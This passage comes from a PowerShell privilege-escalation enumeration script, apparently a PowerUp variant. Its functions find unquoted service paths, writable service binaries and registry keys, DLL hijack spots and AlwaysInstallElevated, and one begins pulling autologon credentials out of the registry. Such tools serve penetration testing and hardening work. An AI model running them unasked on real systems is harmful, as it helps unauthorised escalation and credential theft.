                        Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
                    }
                    $Service | Add-Member -MemberType NoteProperty -Name Dacl -Value  $Dacl
                }
            }
        } catch {
        } finally {
            $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
        }

        $Service.PSObject.TypeNames.Insert(0, 'PowerUp.Service')
        $Service
    }
}


function Get-ServiceWmi {
<#
.SYNOPSIS

Enumerates services using a mix of WMI access and reflection.

Author: Tobias Neitzel (@qtc-de)
License: BSD 3-Clause  
Required Dependencies: PSReflect

.DESCRIPTION

This function uses WMI access to enumerate the basic properties of available services (name, binpath, user, ...).
However, to get the DACL of a service it still relies on Get-Service and Advapi32. The advantage of this function over
Get-ServiceApi is, that it does not required QueryConfig (0x0001) permissions on a service to get its binary path and 
object name. The downside is of course, that it requires WMI access.

.PARAMETER Verbose

Switch. Show warning messages.

.EXAMPLE

Get-ServiceWmi | select -First 1

Name             : AJRouter
ServiceName      : AJRouter
DisplayName      : AllJoyn Router Service
RequiredServices : {}
StartType        : Manual
ObtainedBy       : WMI
ObjectName       : NT AUTHORITY\LocalService
PathName         :  C:\Program Files\AjRouter\Routing Solutions\aj-start.exe
Dacl             : {System.Security.AccessControl.CommonAce, System.Security.AccessControl.CommonAce, System.Security.AccessControl.CommonAce, System.Security.AccessControl.CommonAce...}

Get all services that are available on the system.

.OUTPUTS

PowerUp.Service
#>

    [OutputType('PowerUp.Service')]
    [CmdletBinding()]
    param()
    
    Add-Type -AssemblyName system.serviceprocess
    $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
    $ReadControl = 0x20000

    Get-WmiObject -Class win32_service -ErrorAction SilentlyContinue | ForEach-Object {

        $Service = New-Object PSObject
        $Service | Add-Member -MemberType NoteProperty -Name Name -Value $_.Name
        $Service | Add-Member -MemberType NoteProperty -Name ServiceName -Value $_.Name
        $Service | Add-Member -MemberType NoteProperty -Name DisplayName -Value $_.DisplayName
        $Service | Add-Member -MemberType NoteProperty -Name RequiredServices -Value @()
        $Service | Add-Member -MemberType NoteProperty -Name StartType -Value  $_.StartMode
        $Service | Add-Member -MemberType NoteProperty -Name ObtainedBy -Value  "WMI"
        $Service | Add-Member -MemberType NoteProperty -Name ObjectName -Value $_.StartName
        $Service | Add-Member -MemberType NoteProperty -Name PathName -Value $_.PathName

        $s = Get-Service -Name $_.Name -ErrorAction SilentlyContinue
        try {
            $ServiceHandle = $GetServiceHandle.Invoke($s, @($ReadControl))
            $RequestedSize = $null
            $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref]$RequestedSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if(($LastError -eq 122) -and ($RequestedSize -gt 0)) {

                $BinarySecurityDescriptor = New-Object Byte[]($RequestedSize)
                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $RequestedSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if( $Result ) {
                    $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
                    $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                        Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
                    }
                    $Service | Add-Member -MemberType NoteProperty -Name Dacl -Value  $Dacl
                }
            }
        } catch {
        } finally {
            $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
        }

        $Service.PSObject.TypeNames.Insert(0, 'PowerUp.Service')
        $Service
    }
}


function Get-UnquotedService {
<#
.SYNOPSIS

Takes PowerUp.Service objects as input and returns services with unquoted image
paths that are modifiable by the current user.

Author: Tobias Neitzel (@qtc-de)
License: BSD 3-Clause  
Required Dependencies: 

.DESCRIPTION

This method is also implemented in the ordinary PowerUp script, but uses WMI to query
service information. WMI access is often disabled for low privileged user accounts.
Therefore, it is desireable to have an alternative method, which does not rely on WMI
access. By accepting PowerUp.Service objects as input parameters, it does not matter
how these were initially received. The only important thing is, that they include the
PathName property.

.EXAMPLE

Get-ServiceReg | Get-UnquotedService

Name             : AJRouter
ServiceName      : AJRouter
DisplayName      : @%SystemRoot%\system32\AJRouter.dll,-2
PathName         :  C:\Program Files\AjRouter\Routing Solutions\aj-start.exe
ObjectName       : NT AUTHORITY\LocalService
Access           : {System.Security.AccessControl.CommonAce, System.Security.AccessControl.CommonAce, System.Security.AccessControl.CommonAce, System.Security.AccessControl.CommonAce...}
RequiredServices : 
StartType        : Manual
ModifiablePath1  : "C:\Program Files\AjRouter"
ModifiablePath2  : "C:\Program Files\AjRouter\Routing Solutions\aj-start.exe"

.OUTPUTS

PowerUp.Service

.LINK

https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.Service')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [PSObject[]]
        $Services
    )

    BEGIN {
        $Regex = [regex]"^[^`"'].* .*\.exe"
    }

    PROCESS {
        ForEach($Service in $Services) {

            if( $Service.PathName -eq $Null ) {
                Write-Verbose "Skipping: $($Service.Name) [No Image Path]"
                continue
            }

            if( $Regex.Match($Service.PathName).Success ){

                $SplitPathArray = $Service.PathName.Trim().Split(' ')
                $ConcatPathArray = @()
                for ($i=1;$i -lt $SplitPathArray.Count; $i++) {
                            $ConcatPathArray += $SplitPathArray[0..$i] -join ' '
                }

                $count = 1
                $ModifiableFiles = $ConcatPathArray | Get-ModifiablePath
                $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '') -and ($_.ModifiablePath -ne 'C:\')} | Foreach-Object {
                    $Service | Add-Member -MemberType NoteProperty -Name "ModifiablePath$count" -Value "`"$($_.ModifiablePath)`"" -Force
                    $count += 1
                }
                if( $count -gt 1 ) { 
                    $Service 
                }
            }
        }
    }
}


function Get-ModifiableServiceFile {
<#
.SYNOPSIS

Takes PowerUp.Service objects as input and returns services with modifiable service
files.

Author: Tobias Neitzel (@qtc-de)
License: BSD 3-Clause  
Required Dependencies: 

.DESCRIPTION

This method is also implemented in the ordinary PowerUp script, but uses WMI to query
service information. WMI access is often disabled for low privileged user accounts.
Therefore, it is desireable to have an alternative method, which does not rely on WMI
access. By accepting PowerUp.Service objects as input parameters, it does not matter
how these were initially received. The only important thing is, that they include the
PathName property.

.EXAMPLE

Get-ModifiableServiceFile

Get a set of potentially exploitable service binares/config files.

.OUTPUTS

PowerUp.Service
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.Service')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [PSObject[]]
        $Services
    )

    PROCESS {

        ForEach( $Service in $Services ) {
            $ServiceName = $Service.Name
            $ServicePath = $Service.PathName
            
            if( $ServicePath -eq $null ) {
                Write-Verbose "Skipping: $ServiceName [No Image Path]"
                continue
            }

            $count = 1
            $ServicePath | Get-ModifiablePath | ForEach-Object {
                $Service | Add-Member -MemberType NoteProperty -Name "ModifiableFile$count" -Value "`"$($_.ModifiablePath)`"" -Force
                $count += 1
            }

            if( $count -gt 1 ) { 
                $Service.PSObject.TypeNames.Insert(0, 'PowerUp.Service')
                $Service 
            }
        }
    }
}


function Show-ServicePermissions {
<#
.SYNOPSIS

Takes PowerUp.Service objects and transforms their access permissions in a human readable format.

Author: Tobias Neitzel (@qtc-de)
License: BSD 3-Clause  
Required Dependencies: 

.DESCRIPTION

This method takes PowerUp.Service objects and transforms them to PowerUp.ServicePermission objects.
PowerUp.ServicePermission objects allow easy and organized access to the permissions of a service.
Without any arguments, services where the current user has no access at all are not shown. Use the
-All switch to include all services.

.EXAMPLE

Get-ServiceReg | Show-ServicePermissions

PS C:\Users\IEUser> Get-ServiceReg | Show-ServicePermissions

Service                  Principal                        ObjectName                                                                                                    Permissions
-------                  ---------                        ----------                                                                                                    -----------
AJRouter                 NT AUTHORITY\INTERACTIVE         NT AUTHORITY\LocalService     QueryConfig, QueryStatus, EnumerateDependents, Interrogate, UserDefinedControl, ReadControl
AJRouter                 NT AUTHORITY\Authenticated Users NT AUTHORITY\LocalService                                                                              UserDefinedControl
ALG                      NT AUTHORITY\INTERACTIVE         NT AUTHORITY\LocalService     QueryConfig, QueryStatus, EnumerateDependents, Interrogate, UserDefinedControl, ReadControl
ALG                      NT AUTHORITY\Authenticated Users NT AUTHORITY\LocalService                                                                              UserDefinedControl
AppIDSvc                 NT AUTHORITY\INTERACTIVE         NT Authority\LocalService     QueryConfig, QueryStatus, EnumerateDependents, Interrogate, UserDefinedControl, ReadControl
[...]

Access permissions of the current user.

.EXAMPLE

Get-ServiceReg | Show-ServicePermissions | Where-Object { ($_.ObjectName -match 'SYSTEM') -and ($_.Permissions -match 'change') }

PS C:\Users\IEUser> Get-ServiceReg | Show-ServicePermissions | Where-Object { ($_.ObjectName -match 'SYSTEM') -and ($_.Permissions -match 'all') }

Service      Principal                ObjectName  Permissions
-------      ---------                ----------  -----------
UmRdpService NT AUTHORITY\INTERACTIVE localSystem   AllAccess
[...]

Show services where the current user has AllAccess.

.OUTPUTS

PowerUp.ServicePermission
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ServicePermission')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [PSObject[]]
        $Services,

        [Switch]
        $All
    )

    BEGIN {
        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value
        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach( $Service in $Services ) {

            if( $Service.Dacl -eq $Null ) {
                Write-Verbose "Skipping: $($Service.Name) [No Dacl Property]"
                continue
            }

            $Service | Select-Object -ExpandProperty Dacl | Where-Object { $_.AceType -match 'Allow' } | ForEach-Object {

                $Permissions = $_.AccessRights
                $Sid = $_.SecurityIdentifier   
                try {
                    $i = New-Object System.Security.Principal.SecurityIdentifier($Sid)
                    $Principal = $i.Translate([System.Security.Principal.NTAccount]).Value
                } catch {
                    $Principal = $Sid
                }
                if( ($CurrentUserSids -contains $Sid) -or $All ) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Service' $Service.Name
                    $Out | Add-Member Noteproperty 'Principal' $Principal
                    $Out | Add-Member Noteproperty 'ObjectName' $Service.ObjectName
                    $Out | Add-Member Noteproperty 'Permissions' $Permissions
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ServicePermission')
                    $Out
                }
            }
        }
    }
}

########################################################
#
# DLL Hijacking
#
########################################################

function Find-ProcessDLLHijack {
<#
.SYNOPSIS

Finds all DLL hijack locations for currently running processes.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Enumerates all currently running processes with Get-Process (or accepts an
input process object from Get-Process) and enumerates the loaded modules for each.
All loaded module name exists outside of the process binary base path, as those
are DLL load-order hijack candidates.

.PARAMETER Name

The name of a process to enumerate for possible DLL path hijack opportunities.

.PARAMETER ExcludeWindows

Exclude paths from C:\Windows\* instead of just C:\Windows\System32\*

.PARAMETER ExcludeProgramFiles

Exclude paths from C:\Program Files\* and C:\Program Files (x86)\*

.PARAMETER ExcludeOwned

Exclude processes the current user owns.

.EXAMPLE

Find-ProcessDLLHijack

Finds possible hijackable DLL locations for all processes.

.EXAMPLE

Get-Process VulnProcess | Find-ProcessDLLHijack

Finds possible hijackable DLL locations for the 'VulnProcess' processes.

.EXAMPLE

Find-ProcessDLLHijack -ExcludeWindows -ExcludeProgramFiles

Finds possible hijackable DLL locations not in C:\Windows\* and
not in C:\Program Files\* or C:\Program Files (x86)\*

.EXAMPLE

Find-ProcessDLLHijack -ExcludeOwned

Finds possible hijackable DLL location for processes not owned by the
current user.

.OUTPUTS

PowerUp.HijackableDLL.Process

.LINK

https://www.mandiant.com/blog/malware-persistence-windows-registry/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.HijackableDLL.Process')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessName')]
        [String[]]
        $Name = $(Get-Process | Select-Object -Expand Name),

        [Switch]
        $ExcludeWindows,

        [Switch]
        $ExcludeProgramFiles,

        [Switch]
        $ExcludeOwned
    )

    BEGIN {
        # the known DLL cache to exclude from our findings
        #   http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx
        $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
        $KnownDLLs = $(ForEach ($KeyName in $Keys.GetValueNames()) { $Keys.GetValue($KeyName).tolower() }) | Where-Object { $_.EndsWith(".dll") }
        $KnownDLLPaths = $(ForEach ($name in $Keys.GetValueNames()) { $Keys.GetValue($name).tolower() }) | Where-Object { -not $_.EndsWith(".dll") }
        $KnownDLLs += ForEach ($path in $KnownDLLPaths) { ls -force $path\*.dll | Select-Object -ExpandProperty Name | ForEach-Object { $_.tolower() }}
        $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

        # get the owners for all processes
        $Owners = @{}
        Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object { $Owners[$_.handle] = $_.getowner().user }
    }

    PROCESS {

        ForEach ($ProcessName in $Name) {

            $TargetProcess = Get-Process -Name $ProcessName

            if ($TargetProcess -and $TargetProcess.Path -and ($TargetProcess.Path -ne '') -and ($Null -ne $TargetProcess.Path)) {

                try {
                    $BasePath = $TargetProcess.Path | Split-Path -Parent
                    $LoadedModules = $TargetProcess.Modules
                    $ProcessOwner = $Owners[$TargetProcess.Id.ToString()]

                    ForEach ($Module in $LoadedModules){

                        $ModulePath = "$BasePath\$($Module.ModuleName)"

                        # if the module path doesn't exist in the process base path folder
                        if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {

                            $Exclude = $False

                            if ($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains('C:\Windows')) {
                                $Exclude = $True
                            }

                            if ($PSBoundParameters['ExcludeProgramFiles'] -and $ModulePath.Contains('C:\Program Files')) {
                                $Exclude = $True
                            }

                            if ($PSBoundParameters['ExcludeOwned'] -and $CurrentUser.Contains($ProcessOwner)) {
                                $Exclude = $True
                            }

                            # output the process name and hijackable path if exclusion wasn't marked
                            if (-not $Exclude){
                                $Out = New-Object PSObject
                                $Out | Add-Member Noteproperty 'ProcessName' $TargetProcess.ProcessName
                                $Out | Add-Member Noteproperty 'ProcessPath' $TargetProcess.Path
                                $Out | Add-Member Noteproperty 'ProcessOwner' $ProcessOwner
                                $Out | Add-Member Noteproperty 'ProcessHijackableDLL' $ModulePath
                                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Process')
                                $Out
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "Error: $_"
                }
            }
        }
    }
}


function Find-PathDLLHijack {
<#
.SYNOPSIS

Finds all directories in the system %PATH% that are modifiable by the current user.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-ModifiablePath  

.DESCRIPTION

Enumerates the paths stored in Env:Path (%PATH) and filters each through Get-ModifiablePath
to return the folder paths the current user can write to. On Windows 7, if wlbsctrl.dll is
written to one of these paths, execution for the IKEEXT can be hijacked due to DLL search
order loading.

.EXAMPLE

Find-PathDLLHijack

Finds all %PATH% .DLL hijacking opportunities.

.OUTPUTS

PowerUp.HijackableDLL.Path

.LINK

http://www.greyhathacker.net/?p=738
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.HijackableDLL.Path')]
    [CmdletBinding()]
    Param()

    # use -Literal so the spaces in %PATH% folders are not tokenized
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_
        $ModifidablePaths = $TargetPath | Get-ModifiablePath -Literal | Where-Object {$_ -and ($Null -ne $_) -and ($Null -ne $_.ModifiablePath) -and ($_.ModifiablePath.Trim() -ne '')}
        ForEach ($ModifidablePath in $ModifidablePaths) {
            if ($Null -ne $ModifidablePath.ModifiablePath) {
                $ModifidablePath | Add-Member Noteproperty '%PATH%' $_
                $ModifidablePath | Add-Member Aliasproperty Name '%PATH%'
                $ModifidablePath.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Path')
                $ModifidablePath
            }
        }
    }
}

########################################################
#
# Registry Checks
#
########################################################

function Get-ModifiableReg {
<#
.SYNOPSIS

Takes multiple strings containing registry paths and returns
the registry paths where the current user has modification rights.

Author: Tobias Neitzel (@qtc-de)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Takes a number of registry paths and enumerates the ACLs on them. Any path that
the current user has modification rights on is returned in a custom object that contains
the modifiable path, the owner, associated permission set, and the IdentityReference with 
the specified rights. The SID of the current user and any group he/she are a part of are 
used as the comparison set against the parsed path DACLs.

.PARAMETER Path

The registry path. Required

.EXAMPLE

"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ASP.NET_4.0.30319\Names" | Get-ModifiableReg

ModifiablePath                                                                   Owner                   IdentityReference                 Permissions
--------------                                                                   -----                   -----------------                 -----------
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ASP.NET_4.0.30319\Names     NT AUTHORITY\SYSTEM     BUILTIN\Performance Log Users     {CreateSubKey, SetValue, ReadPermissions, Notify...}


.EXAMPLE

Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services\ -Recurse -ErrorAction SilentlyContinue | Get-ModifiableReg

ModifiablePath                                                                                    Owner                       IdentityReference                Permissions
--------------                                                                                    -----                       -----------------                -----------
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ASP.NET_4.0.30319\Names                      NT AUTHORITY\SYSTEM         BUILTIN\Performance Log Users    {CreateSubKey, SetValue, ReadPermissions, Notify...}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BTAGService\Parameters\Settings              NT SERVICE\TrustedInstaller NT AUTHORITY\INTERACTIVE         {CreateSubKey, SetValue, ReadPermissions}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BTAGService\Parameters\Settings              NT SERVICE\TrustedInstaller NT AUTHORITY\Authenticated Users {CreateSubKey, SetValue, ReadPermissions}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BTAGService\Parameters\Settings\AudioGateway NT AUTHORITY\SYSTEM         NT AUTHORITY\INTERACTIVE         {CreateSubKey, SetValue, ReadPermissions}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BTAGService\Parameters\Settings\AudioGateway NT AUTHORITY\SYSTEM         NT AUTHORITY\Authenticated Users {CreateSubKey, SetValue, ReadPermissions}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BTAGService\Parameters\Settings\HandsFree    NT AUTHORITY\SYSTEM         NT AUTHORITY\INTERACTIVE         {CreateSubKey, SetValue, ReadPermissions}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BTAGService\Parameters\Settings\HandsFree    NT AUTHORITY\SYSTEM         NT AUTHORITY\Authenticated Users {CreateSubKey, SetValue, ReadPermissions}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\embeddedmode\Parameters                      NT AUTHORITY\SYSTEM         NT AUTHORITY\INTERACTIVE         {CreateSubKey, ReadPermissions, EnumerateSubKeys, QueryValues}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\embeddedmode\Parameters                      NT AUTHORITY\SYSTEM         NT AUTHORITY\Authenticated Users {CreateSubKey, ReadPermissions, Notify, EnumerateSubKeys...}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vds\Alignment                                NT AUTHORITY\SYSTEM         NT AUTHORITY\Authenticated Users {CreateSubKey, ReadPermissions, EnumerateSubKeys, QueryValues}

.OUTPUTS

PowerUp.ModifiableReg

Custom PSObject containing the Permissions, Owner, ModifiablePath and IdentityReference for
a modifiable registry path.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableReg')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('PSPath')]
        [Alias('Name')]
        [String[]]
        $Path
    )

    BEGIN {
        
        $AccessMask = @{
             [uint32]'0x80000000' = 'GenericRead'
             [uint32]'0x40000000' = 'GenericWrite'
             [uint32]'0x20000000' = 'GenericExecute'
             [uint32]'0x10000000' = 'GenericAll'
             [uint32]'0x02000000' = 'MaximumAllowed'
             [uint32]'0x00080000' = 'WriteOwner'
             [uint32]'0x00040000' = 'WriteDAC'
             [uint32]'0x00020000' = 'ReadPermissions'
             [uint32]'0x00010000' = 'Delete'
             [uint32]'0x00000020' = 'CreateLink'
             [uint32]'0x00000010' = 'Notify'
             [uint32]'0x00000008' = 'EnumerateSubKeys'
             [uint32]'0x00000004' = 'CreateSubKey'
             [uint32]'0x00000002' = 'SetValue'
             [uint32]'0x00000001' = 'QueryValues'
        }

        # this is an xor of GenericWrite, GenericAll, MaximumAllowed, WriteOwner, WriteDAC, CreateSubKey, SetValue, CreateLink, Delete
        # TODO: Evaluate the exploitation potential of CreateLink
        $MAccessMask = 0x520d0006

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value
        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach($TargetPath in $Path) {

            $CandidatePath = $TargetPath
            if( -not $CandidatePath.StartsWith("Microsoft") ) {
                $CandidatePath = "Microsoft.PowerShell.Core\Registry::$($CandidatePath.replace(':',''))"
            }

            # registry Paths can contain wildcard and other special characters. Therefore they should not be
            # expanded or resolved befor processing
            if (-not (Test-Path -Path $CandidatePath -ErrorAction SilentlyContinue) ) {
                # if the path doesn't exist, check if the parent folder allows for modification.
                # This will not work if the leaf of the missing path contains a forward slash
                $ParentPath = Split-Path -Path $CandidatePath -Parent  -ErrorAction SilentlyContinue
                if (-not ($ParentPath -and (Test-Path -Path $ParentPath)) ) {
                    Write-Verbose "Skipping: $CandidatePath [Not Found]"
                    continue
                } else {
                    $CandidatePath = $ParentPath
                }
            }

            try {
                # Get-Acl fails on paths containing special characters like '/' or '*'. Therefore, we use Get-Item.
                $Key = Get-Item -LiteralPath $CandidatePath -ErrorAction Stop
                $Acl = $Key.GetAccessControl()
                $Owner = $Acl.Owner;

                if( $Owner -notmatch '^S-1-5.*' ) {
                    if( -not $TranslatedIdentityReferences[$Owner] ) {
                        $IdentityUser = New-Object System.Security.Principal.NTAccount($Owner)
                        $TranslatedIdentityReferences[$Owner] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                    }
                    $IdentitySID = $TranslatedIdentityReferences[$Owner]
                } else {
                    $IdentitySID = $Owner
                }

                # If we are owner, we have implicit full control over the object. Only the Owner property is imporant here, as the security group of an object
                # gets ignored (https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961983(v=technet.10)?redirectedfrom=MSDN
                if( $CurrentUserSids -contains $IdentitySID ) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                    $out | Add-Member Noteproperty 'Owner' $Owner
                    $Out | Add-Member Noteproperty 'IdentityReference' $Owner
                    $Out | Add-Member Noteproperty 'Permissions' @('Owner')
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                    $Out
                }

            } catch [System.UnauthorizedAccessException] {
                Write-Verbose "Skipping: $CandidatePath [Access Denied]"
                continue
            }

            $Acl | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                $RegistryRights = $_.RegistryRights.value__

                if( $RegistryRights -band $MAccessMask )  {

                    $Permissions = $AccessMask.Keys | Where-Object { $RegistryRights -band $_ } | ForEach-Object { $AccessMask[$_] }

                    $IdentityRef = $_.IdentityReference
                    if ($IdentityRef -notmatch '^S-1-5.*') {

                        if (-not ($TranslatedIdentityReferences[$IdentityRef])) {
                            $IdentityUser = New-Object System.Security.Principal.NTAccount($IdentityRef)
                            try {
                                $TranslatedIdentityReferences[$IdentityRef] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                            } catch {
                                $TranslatedIdentityReferences[$IdentityRef] = $IdentityUser
                            }
                        }
                        $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]

                    }
                    else {
                        $IdentitySID = $_.IdentityReference
                    }

                    if ($CurrentUserSids -contains $IdentitySID) {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                        $out | Add-Member Noteproperty 'Owner' $Owner
                        $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                        $Out | Add-Member Noteproperty 'Permissions' $Permissions
                        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableReg')
                        $Out
                    }
                }
            }
        }
    }
}


function Get-ModifiableRegistryService {
<#
.SYNOPSIS

Checks for modifiable registry keys inside the HKLM:\SYSTEM\CurrentControlSet\Services\
hive.

Author: Tobias Neitzel (@qtc-de)
License: BSD 3-Clause
Required Dependencies: Get-ModifiableReg

.DESCRIPTION

Checks for modifiable registry keys inside the HKLM:\SYSTEM\CurrentControlSet\Services\
hive. The check is done recursivly, which leads to several irrelevant keys being reported.
However, since it is not possible to know the security relevant keys in advance, this is
the only way to get a reliable result.

.EXAMPLE

Get-ModifiableRegistryService

Get modifiable registry keys from the HLKM:\SYSTEM\CurrentControlSet\Services\ hive.

.OUTPUTS

PowerUp.ModifiableReg

Custom PSObject containing the Permissions, Owner, ModifiablePath and IdentityReference for
a modifiable registry path.
#>
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableReg')]
    [CmdletBinding()]
    Param()

    Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services -Recurse -ErrorAction SilentlyContinue | Get-ModifiableReg
}


function Get-RegistryAlwaysInstallElevated {
<#
.SYNOPSIS

Checks if any of the AlwaysInstallElevated registry keys are set.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Returns $True if the HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
or the HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated keys
are set, $False otherwise. If one of these keys are set, then all .MSI files run with
elevated permissions, regardless of current user permissions.

.EXAMPLE

Get-RegistryAlwaysInstallElevated

Returns $True if any of the AlwaysInstallElevated registry keys are set.

.OUTPUTS

System.Boolean

$True if RegistryAlwaysInstallElevated is set, $False otherwise.
#>

    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    if (Test-Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer') {

        $HKLMval = (Get-ItemProperty -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"

        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){

            $HKCUval = (Get-ItemProperty -Path 'HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"

            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose 'AlwaysInstallElevated enabled on this machine!'
                $True
            }
            else{
                Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
                $False
            }
        }
        else{
            Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
            $False
        }
    }
    else{
        Write-Verbose 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist'
        $False
    }
    $ErrorActionPreference = $OrigError
}


function Get-RegistryAutoLogon {
<#
.SYNOPSIS

Finds any autologon credentials left in the registry.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Checks if any autologon accounts/credentials are set in a number of registry locations.
If they are, the credentials are extracted and returned as a custom PSObject.

.EXAMPLE

Get-RegistryAutoLogon

Finds any autologon credentials left in the registry.

.OUTPUTS

PowerUp.RegistryAutoLogon

Custom PSObject containing autologin credentials found in the registry.

.LINK

